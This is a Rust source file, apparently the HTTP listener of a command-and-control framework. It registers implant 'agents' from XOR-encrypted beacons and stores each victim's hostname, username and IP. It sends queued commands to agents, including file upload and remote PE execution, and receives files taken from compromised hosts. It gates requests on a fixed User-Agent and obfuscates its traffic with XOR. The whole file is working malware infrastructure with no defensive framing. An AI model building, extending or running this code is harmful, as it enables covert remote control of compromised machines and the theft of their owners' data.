use crate::admin::Database;
use crate::agents::agent_handler::{AgentHandler, AgentInfo};
use crate::encryption::XORCipher;
use crate::listener::profile::ListenerProfile;
use axum::Server;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::sync::Arc;

use axum::{
    body::Bytes,
    extract::{Path, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    routing::get,
    routing::post,
    Router,
};

#[derive(Clone)]
struct HttpListenerState {
    profile: ListenerProfile,
    agent_handler: AgentHandler,
    xor_cipher: Arc<XORCipher>,
    database: Arc<Database>,
}

#[derive(Debug, Deserialize, Serialize)]
struct AgentBeacon {
    agent_id: String,
    hostname: String,
    username: String,
    process_name: String,
    ip_address: String,
    results: String,
}

#[derive(Serialize)]
struct AgentCheckinResponse {
    success: bool,
    message: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandItem {
    id: i64,
    command: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandResponse {
    success: bool,
    commands: Vec<CommandItem>,
}

async fn handle_beacon(
    State(state): State<Arc<HttpListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> impl IntoResponse {
    // ===== Vérification User-Agent =====
    if let Some(user_agent) = headers.get("user-agent") {
        if user_agent.to_str().unwrap_or("") != state.profile.user_agent {
            log::warn!("[LISTENER] Invalid User-Agent detected");
            return Response::builder()
                .status(StatusCode::FORBIDDEN)
                .body("".to_string())
                .unwrap();
        }
    } else {
        log::warn!("[LISTENER] Missing User-Agent header");
        return Response::builder()
            .status(StatusCode::FORBIDDEN)
            .body("".to_string())
            .unwrap();
    }

    // ===== Décodage du body =====
    let body_str = match std::str::from_utf8(&body) {
        Ok(s) => s.trim(),
        Err(e) => {
            log::error!("[LISTENER] Invalid UTF-8 in body: {}", e);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::debug!(
        "[LISTENER] Received base64 data (length: {})",
        body_str.len()
    );

    let xor_encrypted_data = match STANDARD.decode(body_str) {
        Ok(data) => data,
        Err(e) => {
            log::error!("[LISTENER] Base64 decode failed: {}", e);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::debug!(
        "[LISTENER] Base64 decoded length: {} bytes",
        xor_encrypted_data.len()
    );

    // ===== Déchiffrement XOR =====
    let decrypted_bytes = state.xor_cipher.decrypt(&xor_encrypted_data);

    let json_data = match String::from_utf8(decrypted_bytes) {
        Ok(s) => s,
        Err(e) => {
            log::error!("[LISTENER] Decrypted data is not valid UTF-8: {}", e);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::info!("[LISTENER] Decrypted JSON: {}", json_data);

    // ===== Parser le JSON =====
    let beacon: AgentBeacon = match serde_json::from_str(&json_data) {
        Ok(b) => b,
        Err(e) => {
            log::error!("[LISTENER] Failed to parse beacon JSON: {}", e);
            log::error!("[LISTENER] Raw decrypted data: '{}'", json_data);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::info!(
        "[+] Beacon received from agent: {} ({}@{} - {})",
        beacon.agent_id,
        beacon.username,
        beacon.hostname,
        beacon.ip_address
    );

    let timestamp = AgentHandler::get_current_timestamp();

    // ===== MODIFICATION: Vérifier si l'agent existe AVANT de l'enregistrer =====
    if let Some(mut existing_agent) = state.agent_handler.get_agent(&beacon.agent_id) {
        log::debug!(
            "[*] Agent {} already exists, updating info",
            beacon.agent_id
        );

        // Mettre à jour uniquement les champs dynamiques
        existing_agent.hostname = Some(beacon.hostname.clone());
        existing_agent.username = Some(beacon.username.clone());
        existing_agent.process_name = Some(beacon.process_name.clone());
        existing_agent.ip = Some(beacon.ip_address.clone());
        existing_agent.last_seen = timestamp;

        state
            .agent_handler
            .update_agent(&beacon.agent_id, existing_agent, Some(&state.database));
    } else {
        log::info!(
            "[+] ✅ New agent detected, registering: {}",
            beacon.agent_id
        );

        let agent_info = AgentInfo {
            agent_id: beacon.agent_id.clone(),
            hostname: Some(beacon.hostname.clone()),
            username: Some(beacon.username.clone()),
            process_name: Some(beacon.process_name.clone()),
            ip: Some(beacon.ip_address.clone()),
            last_seen: timestamp,
            payload_type: "exe".to_string(),
            listener_name: state.profile.name.clone(),
            file_path: None,
        };

        state.agent_handler.register_agent(
            beacon.agent_id.clone(),
            agent_info,
            Some(&state.database),
        );
    }

    // ===== Mettre à jour les informations de la victime dans la DB =====
    if let Err(e) = state.database.update_victim_info(
        &beacon.agent_id,
        &beacon.hostname,
        &beacon.username,
        "Windows",
        &beacon.ip_address,
        &beacon.process_name,
    ) {
        log::warn!("[!] Failed to update victim info: {}", e);
    }

    // ===== Traiter les résultats si présents =====
    if !beacon.results.is_empty() {
        log::info!("[+] Task result received from {}", beacon.agent_id);
        state
            .agent_handler
            .push_result(&beacon.agent_id, beacon.results.clone());

        let (output_to_store, result_type, filename) = {
            // Vérifier d'abord si c'est un message texte simple
            if beacon.results.starts_with("File uploaded successfully")
                || beacon.results.starts_with("Upload successful")
                || beacon.results.starts_with("Error:")
            {
                log::info!("[+] Upload confirmation or error message received");
                (beacon.results.clone(), "text", None)
            } else {
                // Sinon, c'est probablement un résultat encodé (download)
                let decoded_str = if let Ok(decoded_bytes) = STANDARD.decode(&beacon.results) {
                    String::from_utf8(decoded_bytes).unwrap_or_else(|_| beacon.results.clone())
                } else {
                    beacon.results.clone()
                };

                log::debug!(
                    "[DEBUG] Decoded beacon results (first 200 chars): {}",
                    &decoded_str[..decoded_str.len().min(200)]
                );

                // Vérifier si c'est un message d'erreur après décodage
                if decoded_str.starts_with("Error:") {
                    log::warn!("[!] Beacon result is an error message");
                    (decoded_str, "text", None)
                } else {
                    // Parser le JSON décodé (résultat de download)
                    let normalized = decoded_str.replace('\'', "\"");
                    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
                        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
                            let fname = parsed
                                .get("filename")
                                .and_then(|v| v.as_str())
                                .map(|s| s.to_string());

                            if let Some(ref f) = fname {
                                log::info!(
                                    "[+] ✅ File parsed from beacon | filename='{}' | base64_length={}",
                                    f,
                                    content.len()
                                );
                            }

                            (content.to_string(), "file_download", fname)
                        } else {
                            (decoded_str, "text", None)
                        }
                    } else {
                        (decoded_str, "text", None)
                    }
                }
            }
        };

        if let Err(e) = state.database.store_result(
            &beacon.agent_id,
            None,
            &output_to_store,
            true,
            Some(result_type),
        ) {
            log::warn!("[!] Failed to store result in DB: {}", e);
        } else {
            log::info!(
                "[+] ✅ Result stored | type={} | filename={:?} | stored_size={}",
                result_type,
                filename,
                output_to_store.len()
            );
        }
    }

    log::debug!(
        "[LISTENER] Heartbeat processed for agent {}",
        beacon.agent_id
    );

    // ===== Créer la réponse (SANS commandes) =====
    let response = AgentCheckinResponse {
        success: true,
        message: "Check-in successful".to_string(),
    };

    let response_json = match serde_json::to_string(&response) {
        Ok(json) => json,
        Err(e) => {
            log::error!("[LISTENER] Failed to serialize response: {}", e);
            return Response::builder()
                .status(StatusCode::INTERNAL_SERVER_ERROR)
                .body("".to_string())
                .unwrap();
        }
    };

    log::debug!("[LISTENER] Response JSON: {}", response_json);

    let encrypted_response = state.xor_cipher.encrypt(response_json.as_bytes());
    let encoded_response = STANDARD.encode(&encrypted_response);

    log::debug!(
        "[LISTENER] Sending encrypted response (base64 length: {})",
        encoded_response.len()
    );

    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "text/plain")
        .body(encoded_response)
        .unwrap()
}

async fn handle_get_commands(
    State(state): State<Arc<HttpListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> impl IntoResponse {
    // ===== 1. Vérifier User-Agent =====
    if let Some(user_agent) = headers.get("user-agent") {
        if user_agent.to_str().unwrap_or("") != state.profile.user_agent {
            log::warn!("[LISTENER] Invalid User-Agent for /api/command");
            return Response::builder()
                .status(StatusCode::FORBIDDEN)
                .body("".to_string())
                .unwrap();
        }
    } else {
        log::warn!("[LISTENER] Missing User-Agent header");
        return Response::builder()
            .status(StatusCode::FORBIDDEN)
            .body("".to_string())
            .unwrap();
    }

    // ===== 2. Décoder le body =====
    let body_str = match std::str::from_utf8(&body) {
        Ok(s) => s.trim(),
        Err(_) => {
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    let encrypted = match STANDARD.decode(body_str) {
        Ok(d) => d,
        Err(_) => {
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    let decrypted = state.xor_cipher.decrypt(&encrypted);
    let json_data = match String::from_utf8(decrypted) {
        Ok(s) => s,
        Err(_) => {
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    #[derive(Deserialize)]
    struct CommandRequest {
        agent_id: String,
    }

    let request: CommandRequest = match serde_json::from_str(&json_data) {
        Ok(r) => r,
        Err(_) => {
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::info!("[+] Command request from agent {}", request.agent_id);

    // ===== 3. Récupérer les commandes PENDING =====
    let mut commands_with_data = Vec::new();

    match state.database.get_pending_commands(&request.agent_id) {
        Ok(cmds) => {
            for (cmd_id, cmd) in cmds {
                // ===== UPLOAD =====
                if cmd.contains("'upload':") {
                    if let Ok(Some(upload_data)) =
                        state.database.get_upload_data_for_command(cmd_id)
                    {
                        commands_with_data.push(CommandItem {
                            id: cmd_id,
                            command: format!("'upload':'{}'", upload_data),
                        });
                    } else {
                        commands_with_data.push(CommandItem {
                            id: cmd_id,
                            command: cmd,
                        });
                    }
                }
                // ===== PE-EXEC =====
                else if cmd.contains("'pe-exec':") {
                    if let Ok(Some(pe_data)) = state.database.get_pe_exec_data_by_command(cmd_id) {
                        commands_with_data.push(CommandItem {
                            id: cmd_id,
                            command: format!("'pe-exec':'{}'", pe_data),
                        });
                    } else {
                        commands_with_data.push(CommandItem {
                            id: cmd_id,
                            command: cmd,
                        });
                    }
                }
                // ===== STANDARD =====
                else {
                    commands_with_data.push(CommandItem {
                        id: cmd_id,
                        command: cmd,
                    });
                }
            }
        }
        Err(e) => {
            log::error!("[!] Failed to fetch commands: {}", e);
        }
    }

    // ===== 4. Construire la réponse =====
    let response = CommandResponse {
        success: true,
        commands: commands_with_data,
    };

    let response_json = match serde_json::to_string(&response) {
        Ok(j) => j,
        Err(_) => {
            return Response::builder()
                .status(StatusCode::INTERNAL_SERVER_ERROR)
                .body("".to_string())
                .unwrap();
        }
    };

    let encrypted_response = state.xor_cipher.encrypt(response_json.as_bytes());
    let encoded_response = STANDARD.encode(&encrypted_response);

    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "text/plain")
        .body(encoded_response)
        .unwrap()
}

async fn handle_submit_result(
    State(state): State<Arc<HttpListenerState>>,
    headers: HeaderMap,
    body: Bytes,
) -> impl IntoResponse {
    // ===== Vérification User-Agent =====
    if headers.get("user-agent").and_then(|ua| ua.to_str().ok()) != Some(&state.profile.user_agent)
    {
        log::warn!("[LISTENER] Invalid User-Agent for /api/result");
        return Response::builder()
            .status(StatusCode::FORBIDDEN)
            .body("".to_string())
            .unwrap();
    }

    // ===== Décodage Base64 du body =====
    let body_str = match std::str::from_utf8(&body) {
        Ok(s) => s.trim(),
        Err(_) => {
            log::error!("[LISTENER] Invalid UTF-8 in body");
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    let encrypted = match STANDARD.decode(body_str) {
        Ok(d) => d,
        Err(e) => {
            log::error!("[LISTENER] Base64 decode failed: {}", e);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    // ===== Déchiffrement XOR =====
    let decrypted = state.xor_cipher.decrypt(&encrypted);

    let json_data = match String::from_utf8(decrypted) {
        Ok(s) => s,
        Err(e) => {
            log::error!("[LISTENER] Decrypted data is not valid UTF-8: {}", e);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    // ===== Structure attendue de l'agent =====
    #[derive(Deserialize)]
    struct ResultSubmit {
        agent_id: String,
        command_id: Option<i64>,
        output: String,
        success: bool,
        r#types: String,
    }

    let result: ResultSubmit = match serde_json::from_str(&json_data) {
        Ok(r) => r,
        Err(e) => {
            log::error!("[LISTENER] JSON parse error: {}", e);
            log::error!("[LISTENER] Raw decrypted data: '{}'", json_data);
            return Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body("".to_string())
                .unwrap();
        }
    };

    log::info!(
        "[+] Result received | agent={} | cmd={:?} | type={} | success={} | output_length={}",
        result.agent_id,
        result.command_id,
        result.r#types,
        result.success,
        result.output.len()
    );

    // ===== EXTRACTION DU CONTENU SI C'EST UN FICHIER =====
    let (output_to_store, extracted_filename) = if result.r#types == "file" {
        // ÉTAPE 1: Décoder le Base64 pour obtenir le JSON ou message d'erreur
        let decoded_output = match STANDARD.decode(&result.output) {
            Ok(bytes) => match String::from_utf8(bytes) {
                Ok(s) => s,
                Err(e) => {
                    log::error!("[!] Decoded base64 is not valid UTF-8: {}", e);
                    return Response::builder()
                        .status(StatusCode::BAD_REQUEST)
                        .body("".to_string())
                        .unwrap();
                }
            },
            Err(e) => {
                log::warn!(
                    "[!] Failed to decode base64 output (might be plain text): {}",
                    e
                );
                // Si ce n'est pas du Base64, c'est peut-être du texte brut
                result.output.clone()
            }
        };

        log::info!(
            "[DEBUG] Decoded output (first 200 chars): {}",
            &decoded_output[..decoded_output.len().min(200)]
        );

        // Vérifier si c'est un message d'erreur
        if decoded_output.starts_with("Error:") || !result.success {
            log::warn!("[!] Agent returned error: {}", decoded_output);
            (decoded_output, None)
        } else {
            // ÉTAPE 2: Parser le JSON (avec quotes simples → doubles)
            let normalized = decoded_output.replace('\'', "\"");

            match serde_json::from_str::<serde_json::Value>(&normalized) {
                Ok(parsed) => {
                    let content = parsed
                        .get("content")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());

                    let filename = parsed
                        .get("filename")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());

                    match (content, filename.clone()) {
                        (Some(c), Some(f)) => {
                            log::info!(
                                "[+] ✅ File parsed successfully | filename='{}' | content_base64_length={}",
                                f,
                                c.len()
                            );
                            (c, Some(f))
                        }
                        _ => {
                            log::warn!(
                                "[!] JSON missing content or filename, storing decoded output"
                            );
                            (decoded_output, None)
                        }
                    }
                }
                Err(e) => {
                    log::warn!(
                        "[!] Not a JSON file structure (probably text result): {}",
                        e
                    );
                    (decoded_output, None)
                }
            }
        }
    } else {
        // Pour les résultats texte
        (result.output.clone(), None)
    };

    log::info!("[DEBUG] Will store {} bytes in DB", output_to_store.len());

    // ===== STOCKER DANS LA DB =====
    match state.database.store_result(
        &result.agent_id,
        result.command_id,
        &output_to_store,
        result.success,
        Some(&result.r#types),
    ) {
        Ok(result_id) => {
            let filename_log = extracted_filename
                .or_else(|| {
                    if let Some(cmd_id) = result.command_id {
                        state.database.extract_filename_from_command_id(cmd_id)
                    } else {
                        None
                    }
                })
                .unwrap_or_else(|| "None".to_string());

            log::info!(
                "[+] ✅ Result stored | result_id={} | filename={} | stored_size={} | success={}",
                result_id,
                filename_log,
                output_to_store.len(),
                result.success
            );
        }
        Err(e) => {
            log::error!("[!] ❌ Failed to store result | error={}", e);
            return Response::builder()
                .status(StatusCode::INTERNAL_SERVER_ERROR)
                .body("".to_string())
                .unwrap();
        }
    }

    // ===== Réponse à l'agent =====
    let response = serde_json::json!({
        "success": true
    });

    let encrypted_response = state
        .xor_cipher
        .encrypt(serde_json::to_string(&response).unwrap().as_bytes());

    let encoded_response = STANDARD.encode(encrypted_response);

    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "text/plain")
        .body(encoded_response)
        .unwrap()
}

#[derive(Serialize)]
struct ApiResponse {
    success: bool,
    message: String,
}

async fn get_pe_exec_data(
    State(state): State<Arc<HttpListenerState>>,
    Path(command_id): Path<i64>,
) -> impl IntoResponse {
    // ✅ Changé de Response à impl IntoResponse
    log::info!(
        "[PE-DATA] Agent requesting PE-exec data for command {}",
        command_id
    );

    match state.database.get_pe_exec_data_by_command(command_id) {
        Ok(Some(pe_json_data)) => {
            // ✅ C'est déjà du JSON, pas du base64
            log::info!(
                "[PE-DATA] ✅ PE-exec data found | command={} | size={} bytes",
                command_id,
                pe_json_data.len()
            );

            // ✅ Chiffrer directement le JSON avec XOR
            let encrypted_payload = state.xor_cipher.encrypt(pe_json_data.as_bytes());

            log::info!(
                "[PE-DATA] Encrypted | size={} bytes",
                encrypted_payload.len()
            );

            // ✅ Encoder en Base64 pour le transport HTTP
            let final_response = STANDARD.encode(&encrypted_payload);

            log::info!(
                "[PE-DATA] ✅ Sending response | final_size={} bytes",
                final_response.len()
            );

            Response::builder()
                .status(StatusCode::OK)
                .header("Content-Type", "text/plain")
                .header("Content-Length", final_response.len().to_string())
                .body(final_response)
                .unwrap()
        }
        Ok(None) => {
            log::warn!(
                "[PE-DATA] ❌ No PE-exec data found for command {}",
                command_id
            );

            let resp = ApiResponse {
                success: false,
                message: format!("No PE-exec data found for command {}", command_id),
            };

            let json = serde_json::to_string(&resp).unwrap_or_else(|_| "{}".to_string());

            Response::builder()
                .status(StatusCode::NOT_FOUND)
                .header("Content-Type", "application/json")
                .body(json)
                .unwrap()
        }
        Err(e) => {
            log::error!("[PE-DATA] ❌ Database error: {}", e);

            let resp = ApiResponse {
                success: false,
                message: format!("Database error: {}", e),
            };

            let json = serde_json::to_string(&resp).unwrap_or_else(|_| "{}".to_string());

            Response::builder()
                .status(StatusCode::INTERNAL_SERVER_ERROR)
                .header("Content-Type", "application/json")
                .body(json)
                .unwrap()
        }
    }
}

// ===== FONCTION START AVEC CHARGEMENT DES AGENTS =====
pub async fn start(profile: ListenerProfile, agent_handler: AgentHandler, database: Arc<Database>) {
    let xor_cipher = Arc::new(XORCipher::new(&profile.xor_key));

    // ===== NOUVEAU: Charger les agents existants depuis la DB =====
    log::info!(
        "[*] Loading existing agents for listener '{}'...",
        profile.name
    );
    match agent_handler.load_agents_from_db(&database) {
        Ok(count) => {
            if count > 0 {
                log::info!("[+] ✅ Restored {} existing agent(s) from database", count);
            } else {
                log::info!("[*] No existing agents to restore");
            }
        }
        Err(e) => {
            log::error!("[!] ⚠️  Failed to load agents from database: {}", e);
            log::warn!("[!] Continuing without restored agents...");
        }
    }

    let state = Arc::new(HttpListenerState {
        profile: profile.clone(),
        agent_handler,
        xor_cipher,
        database,
    });

    let app = Router::new()
        .route(&profile.uri_paths, post(handle_beacon))
        .route("/api/pe-data/:command_id", get(get_pe_exec_data))
        .route("/api/command", post(handle_get_commands))
        .route("/api/result", post(handle_submit_result))
        .with_state(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], profile.port));
    log::info!("[+] HTTP Listener '{}' starting on {}", profile.name, addr);

    let server = Server::bind(&addr).serve(app.into_make_service());

    if let Err(e) = server.await {
        log::error!("[!] Listener error: {}", e);
    }
}
